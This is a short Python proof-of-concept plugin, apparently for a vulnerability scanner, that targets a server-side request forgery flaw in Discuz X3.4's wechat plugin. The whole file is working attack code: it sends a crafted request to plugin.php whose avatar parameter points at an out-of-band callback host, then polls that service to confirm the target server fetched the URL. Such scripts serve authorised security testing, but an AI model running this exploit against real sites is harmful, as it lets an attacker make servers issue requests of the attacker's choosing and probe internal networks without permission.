#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import time
import random
from string import ascii_lowercase
from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'discuz x3.4 ssrf'
        self.keyword = ['discuz']
        self.info = 'discuz x3.4 ssrf'
        self.type = 'ssrf'
        self.level = 'high'
        self.refer = 'https://zhuanlan.zhihu.com/p/51907363, https://www.seebug.org/vuldb/ssvid-97709'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            for path in path_list:
                dns = self.ceye_dns_api()
                url = path + "/plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=%s&wxopenid=%s" %(dns,''.join([random.choice(ascii_lowercase) for _ in range(8)]))
                res = self.curl('get', url)
                if res != None :
                    time.sleep(3)
                    if self.ceye_verify_api(dns,'http'):
                        self.flag = 1
                        self.req.append({"flag": url})
                        self.res.append({"info": url, "key": "discuz x3.4 ssrf"})
